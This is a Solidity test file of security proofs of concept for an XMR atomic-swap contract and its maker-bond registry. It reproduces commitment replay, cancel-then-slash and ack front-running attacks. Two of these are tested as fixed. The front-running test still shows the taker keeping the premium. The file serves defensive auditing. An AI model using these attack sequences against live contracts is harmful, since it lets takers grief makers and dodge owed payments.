// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
import {SecBase} from "./Base.sol";
import {XmrSwapV3} from "../../src/XmrSwapV3.sol";
import {SeshRegistry} from "../../src/registry/SeshRegistry.sol";
import {ExitLease} from "../../src/exits/ExitLease.sol";
import {MockUSDC} from "../../src/MockUSDC.sol";

/// Proofs of concept for the findings in test/security/README.md. On this
/// branch H-1 and H-2 are fixed and their tests check the attack now fails;
/// M-1 (a design trade-off) still shows the attacker's gain.
contract SecurityPoC is SecBase {
    XmrSwapV3 v3;
    SeshRegistry reg;
    ExitLease el;
    MockUSDC usdc;

    uint256 makerPk = 0x3A4E5;
    address maker;
    address taker = address(0xA11CE);
    address claimer = address(0xC1A1);
    uint256 lid;
    uint64 constant D1 = 1 hours;
    uint64 constant D2 = 1 hours;
    uint64 constant G = 30 minutes;
    string constant MSESH = "maker1.sesh";

    function setUp() public {
        vm.warp(1_000_000);
        (v3, reg, el, usdc) = deployAll();
        maker = vm.addr(makerPk);
        vm.deal(maker, 10 ether);
        vm.deal(taker, 10 ether);
        vm.prank(maker);
        lid = reg.register{value: MAKER_BOND}(MSESH, "maker", "");
    }

    function _lock(uint256 value, bytes32 salt) internal returns (XmrSwapV3.Swap memory s, bytes32 id) {
        s = XmrSwapV3.Swap(
            taker, claimer, BOB_K, ALICE_K,
            uint64(block.timestamp) + D1, uint64(block.timestamp) + D1 + D2, G,
            address(0), value, 0, salt
        );
        vm.prank(taker);
        id = v3.lock{value: value}(claimer, BOB_K, ALICE_K, D1, D2, G, address(0), value, 0, salt);
    }

    function _commitment(uint256 value) internal view returns (SeshRegistry.Commitment memory c) {
        c = SeshRegistry.Commitment(
            lid, taker, claimer, BOB_K, address(0), value, 1, MIN_PEN, ATTEST, uint64(block.timestamp) + 15 minutes
        );
    }

    function _sign(SeshRegistry.Commitment memory c) internal view returns (uint8 v, bytes32 r, bytes32 s) {
        return vm.sign(makerPk, reg.commitmentDigest(c));
    }

    /// H-1 (fixed): one signed Commitment used to be recordable against many
    /// V3 swaps with the same terms and different salts. Now each signed
    /// commitment is accepted once.
    function test_PoC_H1_CommitmentReplayAcrossSalts() public {
        uint256 value = 0.001 ether;
        SeshRegistry.Commitment memory c = _commitment(value);
        (uint8 v, bytes32 r, bytes32 ss) = _sign(c); // maker signs ONCE
        (XmrSwapV3.Swap memory s1,) = _lock(value, bytes32(uint256(1)));
        reg.commit(s1, c, v, r, ss);
        (XmrSwapV3.Swap memory s2,) = _lock(value, bytes32(uint256(2)));
        vm.expectRevert(SeshRegistry.WrongStatus.selector);
        reg.commit(s2, c, v, r, ss);
        assertEq(reg.listing(lid).openCommits, 1);
        assertEq(reg.listing(lid).reserved, MIN_PEN);
    }

    /// H-2 (fixed): the taker used to lock, commit and cancel at once (so the
    /// maker never locks XMR and never acks) and then slash. A cancel made
    /// before attestBy now blocks the slash, and so does a refund.
    function test_PoC_H2_CancelThenSlash() public {
        uint256 value = 0.001 ether;
        SeshRegistry.Commitment memory c = _commitment(value);
        (uint8 v, bytes32 r, bytes32 ss) = _sign(c);
        (XmrSwapV3.Swap memory s, bytes32 id) = _lock(value, bytes32(uint256(1000)));
        reg.commit(s, c, v, r, ss);
        vm.prank(taker);
        v3.cancelIntent(s); // same block as the lock
        vm.warp(block.timestamp + ATTEST);
        vm.expectRevert(SeshRegistry.WrongStatus.selector);
        reg.slash(id); // CANCELLING, cancelled before attestBy
        vm.prank(taker);
        v3.refund(s, ALICE_S);
        vm.expectRevert(SeshRegistry.WrongStatus.selector);
        reg.slash(id); // REFUNDED
        assertEq(reg.listing(lid).bond, MAKER_BOND);
    }

    /// A real no-show is still slashable: no ack by attestBy, the taker then
    /// cancels (after attestBy) and slashes before it refunds.
    function test_H2_NoShowStillSlashableAfterLateCancel() public {
        uint256 value = 0.001 ether;
        SeshRegistry.Commitment memory c = _commitment(value);
        (uint8 v, bytes32 r, bytes32 ss) = _sign(c);
        (XmrSwapV3.Swap memory s, bytes32 id) = _lock(value, bytes32(uint256(1001)));
        reg.commit(s, c, v, r, ss);
        vm.warp(block.timestamp + ATTEST);
        vm.prank(taker);
        v3.cancelIntent(s);
        uint256 before = taker.balance;
        reg.slash(id);
        assertEq(taker.balance - before, MIN_PEN);
    }

    /// Exact boundary: a cancel at attestBy - 1 blocks the slash, one at attestBy does not.
    function testFuzz_H2_CancelTimingBoundary(uint8 off) public {
        uint256 value = 0.001 ether;
        SeshRegistry.Commitment memory c = _commitment(value);
        (uint8 v, bytes32 r, bytes32 ss) = _sign(c);
        (XmrSwapV3.Swap memory s, bytes32 id) = _lock(value, bytes32(uint256(2000)));
        reg.commit(s, c, v, r, ss);
        (, uint64 attestBy,,,,) = reg.commits(id);
        uint256 tc = uint256(attestBy) - 3 + (off % 6);
        vm.warp(tc);
        vm.prank(taker);
        v3.cancelIntent(s);
        vm.warp(attestBy > tc ? attestBy : tc);
        if (tc < attestBy) {
            vm.expectRevert(SeshRegistry.WrongStatus.selector);
            reg.slash(id);
        } else {
            reg.slash(id);
        }
    }

    /// FINDING M-1: the premium can be dodged by front-running ackLocked.
    /// The taker can see the maker's XMR arrive at the shared address (it holds
    /// the shared view key). It then sends cancelIntent before the maker's
    /// ackLocked is mined; ackLocked reverts (stage is no longer PENDING) and
    /// the refund returns the premium to the taker. The maker's XMR is safe
    /// (refund reveals the key share), but the premium meant to pay for this
    /// griefing is never paid.
    function test_PoC_M1_AckFrontRunKeepsPremium() public {
        uint256 bobPk = 0xB0B5EC;
        address bob = vm.addr(bobPk);
        address sink = address(0x5111C);
        uint256 value = 1 ether;
        uint256 premium = 0.01 ether;
        XmrSwapV3.Swap memory s = XmrSwapV3.Swap(
            taker, bob, BOB_K, ALICE_K, uint64(block.timestamp) + D1, uint64(block.timestamp) + D1 + D2, G,
            address(0), value, premium, bytes32(uint256(7))
        );
        vm.prank(taker);
        bytes32 id = v3.lock{value: value + premium}(bob, BOB_K, ALICE_K, D1, D2, G, address(0), value, premium, s.salt);
        // maker locks XMR off-chain and signs the ack ...
        (uint8 v, bytes32 r, bytes32 ss) = vm.sign(bobPk, v3.ackDigest(id, sink));
        // ... taker front-runs it
        vm.prank(taker);
        v3.cancelIntent(s);
        vm.expectRevert(XmrSwapV3.WrongStatus.selector);
        v3.ackLocked(s, sink, v, r, ss);
        uint256 before = taker.balance;
        vm.prank(taker);
        v3.refund(s, ALICE_S);
        assertEq(taker.balance - before, value + premium, "premium came back to the taker");
        assertEq(sink.balance, 0);
    }
}
